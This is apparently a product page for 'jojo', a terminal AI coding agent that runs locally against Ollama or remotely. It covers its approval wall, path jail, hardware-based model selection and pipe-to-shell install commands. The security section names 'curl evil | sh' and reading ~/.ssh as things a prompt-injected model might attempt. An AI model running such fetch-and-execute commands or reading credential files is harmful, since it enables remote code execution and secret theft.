local or remote

Two ways to run the same agent

The client is identical either way — one curses app. What changes is where the loop runs and whose GPU answers.

local

Your machine, your model

The loop runs on your box and talks straight to Ollama on 127.0.0.1:11434. Nothing leaves the machine at runtime. ollama-setup.sh installs the runtime; recommend-model.py reads your RAM / VRAM / unified memory and pulls a model that fits.

remote

Someone else's GPU

jojo --remote https://host --login — email and a one-time code, then a WebSocket session. The server runs the loop and the big model; tool calls still execute locally, path-jailed to your project, and you approve every destructive one. A drop resumes without re-running a side effect.

the agent loop

It proposes; you decide; it verifies

The model can ask for a tool call — it cannot run anything. Destructive calls hit an approval wall regardless of any allow-list, and file or command output fed back to the model is framed as untrusted data.

  • Approval on every write. y / n / a on each write_file and run_command, with a diff preview. Reads and listings are free.
  • Path-jailed. Every path resolves inside the project root; ../, symlinks and absolute escapes are refused before the tool runs, not judged after.
  • Exactly-once tools. Each tool_request carries a stable id; the client journals the result. Crash mid-call, reconnect, and the server replays the request — the client answers from its journal without re-executing the side effect.
  • Knows when to stop. The model says done · a per-turn tool cap · a wall-clock limit · your CtrlC · lost authorization. Then a one-paragraph summary.
models

The biggest model the hardware can actually hold

recommend-model.py reads cores, RAM, NVIDIA VRAM, and Apple or Grace-class unified memory, then ranks by a conservative usable-memory budget — a model that swaps is worse than a smaller one that doesn't.

install

One command, no root

Creates a private virtualenv, installs the TUI, drops a jojo launcher on your PATH, and offers to set up Ollama and pick a model. The installer fetches Python and the curses backport for you if they're missing, so the splash, the cat and the gradient are the same on every platform.

# the TUI · Linux / macOS

curl -fsSL https://ai.jojocode.in/install.sh | sh

# the TUI · Windows (PowerShell)

irm https://ai.jojocode.in/install.ps1 | iex

# local inference — skip it entirely for remote mode

curl -fsSL https://ai.jojocode.in/ollama-setup.sh | sh
python3 recommend-model.py --run

# update · remove

pip install -U jojocode-ai-tui
rm -rf ~/.local/share/jojocode-ai ~/.local/bin/jojo
security

The client's permission model is a security component

A prompt-injected model trying to read ~/.ssh or run curl evil | sh has to get past a human. The hosted service adds an identity spine on top.

Approval wall
Destructive tool calls need explicit confirmation in the TUI — the model can never widen its own permissions.
Path jail
Every file path is forced inside the project root; escapes are refused before execution.
Untrusted output
File and command output fed back to the model is framed as data, never as instructions.
OTP, no passwords
Hosted login is email plus a one-time code. Tokens are opaque; only their SHA-256 is stored, so a database leak yields nothing usable.
Fail-closed authz
One authorize() runs on connect, on every message, and on a periodic sweep. If the control plane is unreachable, access is denied.
RBAC + time-boxed access
Roles user / admin / superadmin. Ordinary users need an active, time-boxed grant; revoke it and open sessions close within one sweep.
